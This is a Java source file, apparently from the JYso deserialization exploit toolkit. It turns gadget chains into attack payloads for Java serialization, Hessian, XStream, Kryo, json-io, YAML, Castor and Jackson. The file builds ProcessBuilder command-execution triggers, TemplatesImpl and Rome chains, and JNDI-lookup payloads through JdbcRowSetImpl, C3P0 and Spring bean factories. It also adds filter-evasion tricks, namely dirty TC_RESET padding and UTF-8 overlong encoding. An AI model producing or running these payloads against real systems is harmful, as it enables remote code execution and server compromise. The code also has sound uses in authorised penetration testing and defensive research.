package com.qi4l.JYso.gadgets.utils;


import com.caucho.hessian.io.*;
import com.cedarsoftware.util.io.JsonWriter;
import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Output;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.qi4l.JYso.gadgets.*;
import com.qi4l.JYso.gadgets.utils.utf8OverlongEncoding.UTF8OverlongObjectOutputStream;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import com.thoughtworks.xstream.XStream;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.*;
import java.util.concurrent.Callable;

import javax.xml.transform.Templates;

import static com.qi4l.JYso.gadgets.Config.Config.*;

public class Serializer implements Callable<byte[]> {
    private final Object object;

    public static Boolean globalinline = false;

    public Serializer(Object object) {
        this.object = object;
    }

    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        serialize(obj, out);
        return out.toByteArray();
    }

    public static byte[] serialize(final Object obj, final ByteArrayOutputStream out) throws IOException {
        final ObjectOutputStream objOut;
        objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        byte[] bytes = out.toByteArray();
        objOut.close();
        return bytes;
    }


    public static void qiserialize(Object obj, final OutputStream out,String payloadType,String Command) throws Exception {
        ObjectOutputStream    objOut  = null;
        AbstractHessianOutput AobjOut = null;
        ByteArrayOutputStream outB64 = new ByteArrayOutputStream();

        if (IS_DIRTY_IN_TC_RESET) {
            objOut = new SuObjectOutputStream(out);
        } else if (IS_UTF_Bypass) {
            if (BASE64) {
                objOut = new UTF8OverlongObjectOutputStream(outB64);
            } else {
                objOut = new UTF8OverlongObjectOutputStream(out);
            }
        } else if (IS_Hessian1) {
            if (BASE64) {
                AobjOut = new HessianOutput(outB64);
            } else {
                AobjOut = new HessianOutput(out);
            }
            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            AobjOut.setSerializerFactory(sf);
        } else if (IS_Hessian2) {
            if (BASE64) {
                AobjOut = new Hessian2Output(outB64);
            } else {
                AobjOut = new Hessian2Output(out);
            }
            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            AobjOut.setSerializerFactory(sf);
            AobjOut.writeObject(obj);
            AobjOut.close();
        } else if (IS_Xstream) {
            XStream xstream = new XStream();
            String xml = xstream.toXML(obj);
            System.out.println(xml);
        } else if (IS_Kryo) {
            Kryo kryo = new Kryo();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (Output output = new Output(bos)) {
                kryo.writeClassAndObject(output, obj);
            }
            if(BASE64){
                String base64String = Base64.getEncoder().encodeToString(bos.toByteArray());
                System.out.println(base64String);
                return;
            }else{
                System.out.println(bos);
                return;
            }
        } else if (IS_JsonIO){
            if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")) {
                UtilFactory uf = new UtilFactory();
                obj =  SpringUtil.makeBeanFactoryTriggerBFPA(uf, "caller", SpringUtil.makeMethodTrigger(new ProcessBuilder(Command), "start"));
                System.out.println(obj);
                return;
            }else if (payloadType.equals("Rome")){
                obj = makeRome(Command);
                System.out.println(obj);
                return;
            }
            String  jsonio = JsonWriter.objectToJson(obj);
            System.out.println(jsonio);
            return;
        } else if (IS_YamlBeans){
            obj = YamlBeansHandler(payloadType,Command);
            System.out.println(obj);
            return;
        } else if (IS_JYAML) {
            String payload = JYamlHandler(payloadType,Command);
            System.out.println(payload);
            return;
        } else if (IS_Castor) {
            obj = CastorHandler(payloadType,Command);
            System.out.println(obj);
            return;
        }else if (IS_Jackson){
            obj = JacksonHandler(payloadType,Command);
            System.out.println(obj);
            return;
        }else {
            if (BASE64) {
                objOut = new SuObjectOutputStream(outB64);
            } else {
                objOut = new SuObjectOutputStream(out);
            }
        }

        if (IS_Hessian1 || IS_Hessian2) {
            AobjOut.writeObject(obj);
        } else {
            objOut.writeObject(obj);
        }

        if (BASE64) {
            String encodedString = Base64.getEncoder().encodeToString(outB64.toByteArray());
            System.out.println(encodedString);
        }
    }

    public byte[] call() throws Exception {
        return serialize(object);
    }

    public static Object makeRome(String Command) throws Exception {
        UtilFactory uf = new UtilFactory();
        String args[] = {Command};
        Object tpl = TemplatesUtil.createTemplatesImpl(args);
        Object obj1 = makeROMEAllPropertyTrigger(uf, Templates.class, (Templates) tpl);
        String marshalled = JsonWriter.objectToJson(obj1);
        // add the transient _tfactory field
        marshalled = marshalled.replace(
                "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",",
                "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_tfactory\""
                        + ": {\"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"},");
        return marshalled;
    }

    public static <T> Object makeROMEAllPropertyTrigger(UtilFactory uf, Class<T> type, T obj) throws Exception {
        ToStringBean item = new ToStringBean(type, obj);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        return uf.makeHashCodeTrigger(root);
    }

    public static Object YamlBeansHandler(String payloadType, String command ) throws IOException, URISyntaxException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        globalinline = true;
        if(payloadType.equals("C3P0WrapperConnPool")) {
            URI uri = new URI(command);
            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
            return writeObject(
                    WrapperConnectionPoolDataSource.class,
                    Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]))));
        }else{
            return null;
        }
    }

    public static Object JacksonHandler(String payloadType, String command) throws Exception {
        if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")){
            String jndiUrl = command;
            Map<String, String> values = new LinkedHashMap<>();
            values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
            values.put("adviceBeanName", quoteString(jndiUrl));
            return writeCollection(
                    HashSet.class.getName(),
                    writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, values),
                    writeJackJsonObject(DefaultBeanFactoryPointcutAdvisor.class, Collections.EMPTY_MAP));
        }else if (payloadType.equals("C3P0WrapperConnPool")){
            URI uri = new URI(command);
            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
            return writeJackJsonObject(
                    WrapperConnectionPoolDataSource.class,
                    Collections.singletonMap("userOverridesAsString", quoteString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]))));
        }else if (payloadType.equals("SpringPropertyPathFactory")){
            Map<String, String> values = new LinkedHashMap<>();
            String jndiUrl = command;
            values.put("targetBeanName", quoteString(jndiUrl));
            values.put("propertyPath", quoteString("foo"));
            values.put("beanFactory", makeSpringJndiBeanFactory(jndiUrl));
            return writeJackJsonObject(PropertyPathFactoryBean.class, values);
        }else if (payloadType.equals("JdbcRowSet")){
            Map<String, String> values = new LinkedHashMap<>();
            values.put("dataSourceName", quoteString(command));
            values.put("autoCommit", "true");
            return writeJackJsonObject(JdbcRowSetImpl.class, values);
        }else if (payloadType.equals("C3P0RefDataSource")){
            Map<String, String> values = new LinkedHashMap<>();
            values.put("jndiName", quoteString(command));
            values.put("loginTimeout", "0");
            return writeJackJsonObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", values);
        }else{
            return null;
        }
    }


    public static String JYamlHandler(String payloadType, String command) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        if (payloadType.equals("JdbcRowSet")) {
            Map<String, String> properties = new LinkedHashMap<>();
            properties.put("dataSourceName", writeString(command));
            properties.put("autoCommit", "true");
            return writeObject(JdbcRowSetImpl.class, properties);
        } else if (payloadType.equals("C3P0WrapperConnPool")) {
            URI uri = new URI(command);
            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
            return writeObject(
                    WrapperConnectionPoolDataSource.class,
                    Collections.singletonMap("userOverridesAsString", writeString(C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]))));
        } else if (payloadType.equals("C3P0RefDataSource")) {
            Map<String, String> props = new LinkedHashMap<>();
            props.put("jndiName", writeString(command));
            props.put("loginTimeout", "0");
            return writeObject("com.mchange.v2.c3p0.JndiRefForwardingDataSource", props);
        }
        else {
            return null;
        }
    }

    public static Object CastorHandler(String payloadType, String command) throws URISyntaxException, IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        if (payloadType.equals("SpringAbstractBeanFactoryPointcutAdvisor")){
            String jndiName = command;
            return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                    + "xmlns:java=\"http://java.sun.com\" xsi:type=\"java:org.springframework.beans.factory.config.PropertyPathFactoryBean\">"
                    + "<target-bean-name>" + jndiName + "</target-bean-name><property-path>foo</property-path>"
                    + "<bean-factory xsi:type=\"java:org.springframework.jndi.support.SimpleJndiBeanFactory\">" + "<shareable-resource>" + jndiName
                    + "</shareable-resource></bean-factory></x>";
        }else if (payloadType.equals("C3P0WrapperConnPool")){
            URI uri = new URI(command);
            String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
            return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                    + "xmlns:java=\"http://java.sun.com\" xsi:type=\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" "
                    + "user-overrides-as-string=\"" + C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]) + "\"/>";
        }else{
            return null;
        }
    }


    public static class SuObjectOutputStream extends ObjectOutputStream {

        public SuObjectOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void writeStreamHeader() throws IOException {
            super.writeStreamHeader();
            try {
                // 写入
                for (int i = 0; i < DIRTY_LENGTH_IN_TC_RESET; i++) {
                    Reflections.getMethodAndInvoke(Reflections.getFieldValue(this, "bout"), "writeByte", new Class[]{int.class}, new Object[]{TC_RESET});
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static class NoWriteReplaceSerializerFactory extends SerializerFactory {

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
         */
        @Override
        public com.caucho.hessian.io.Serializer getObjectSerializer (Class<?> cl ) throws HessianProtocolException {
            return super.getObjectSerializer(cl);
        }

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
         */
        @Override
        public com.caucho.hessian.io.Serializer getSerializer (Class cl ) throws HessianProtocolException {
            com.caucho.hessian.io.Serializer serializer = super.getSerializer(cl);

            if ( serializer instanceof WriteReplaceSerializer ) {
                return UnsafeSerializer.create(cl);
            }
            return serializer;
        }
    }



    protected static String writeObject(Class<?> clazz, Map<String, String> properties, String... consArgs) {
        return writeObject(clazz.getName(), properties, consArgs);
    }

    protected static String writeObject(String clazz, Map<String, String> properties, String... consArgs) {
        return writeObject(clazz, properties, 0, consArgs);
    }

    protected static String writeObject(Class<?> clazz, Map<String, String> properties, int level, String... consArgs) {
        return writeObject(clazz.getName(), properties, level, consArgs);
    }

    protected static String writeObject(String clazz, Map<String, String> properties, int level, String... consArgs) {
        StringBuilder sb = new StringBuilder();
        sb.append(writeConstructor(clazz, globalinline, consArgs));

        if (!properties.isEmpty()) {
            int indent = (level + 1) * 2;
            for (Map.Entry<String, String> prop : properties.entrySet()) {
                sb.append('\n');
                for (int i = 0; i < indent; i++) {
                    sb.append(' ');
                }
                sb.append(prop.getKey());
                sb.append(':').append(' ');
                sb.append(prop.getValue());
            }
        }
        return sb.toString();
    }


    protected static String writeConstructor(Class<?> clazz, boolean inline, String... args) {
        return writeConstructor(clazz.getName(), inline, args);
    }

    protected static String writeConstructor(String clazz, boolean inline, String... args) {
        StringBuilder sb = new StringBuilder();
        sb.append(constructorPrefix(inline));
        sb.append(clazz);
        return sb.toString();
    }

    protected  static String constructorPrefix ( boolean inline ) {
        if ( !inline ) {
            return "foo: !";
        }
        return "!";
    }

    public static String writeString(String string) {
        return '"' + string + '"';
    }

    public static String writeJackJsonObject( Class<?> clazz, Map<String, String> values ) {
        return writeJackJsonObject(clazz.getName(), values);
    }
    public static String writeJackJsonObject ( String type, Map<String, String> properties ) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        sb.append('"').append(type).append('"');
        sb.append(',');
        sb.append('{');
        boolean first = true;
        for ( Map.Entry<String, String> e : properties.entrySet() ) {
            if ( !first ) {
                sb.append(',');
            }
            else {
                first = false;
            }
            writeProperty(sb, e.getKey(), e.getValue());
        }
        sb.append('}');
        sb.append(']');
        return sb.toString();
    }

    public static void writeProperty ( StringBuilder sb, String key, String value ) {
        sb.append('"').append(key).append('"');
        sb.append(':');
        sb.append(value);
    }

    public static String writeCollection ( String type, String... values ) {
        StringBuilder sb = new StringBuilder();
        sb.append('[');
        sb.append('"').append(type).append('"');
        sb.append(',');
        arrayHandler(sb, values);
        sb.append(']');
        return sb.toString();
    }

    public static void arrayHandler(StringBuilder sb, String[] values) {
        sb.append('[');
        boolean first = true;
        for ( String val : values ) {
            if ( !first ) {
                sb.append(',');
            }
            else {
                first = false;
            }
            sb.append(val);
        }
        sb.append(']');
    }

    public static String makeSpringJndiBeanFactory ( String jndiUrl ) {
        return writeJackJsonObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(quoteString(jndiUrl))));
    }
    public static String quoteString ( String string ) {
        return '"' + string + '"';
    }

    public static String writeArray ( String... elements ) {
        StringBuilder sb = new StringBuilder();
        arrayHandler(sb, elements);
        return sb.toString();
    }




}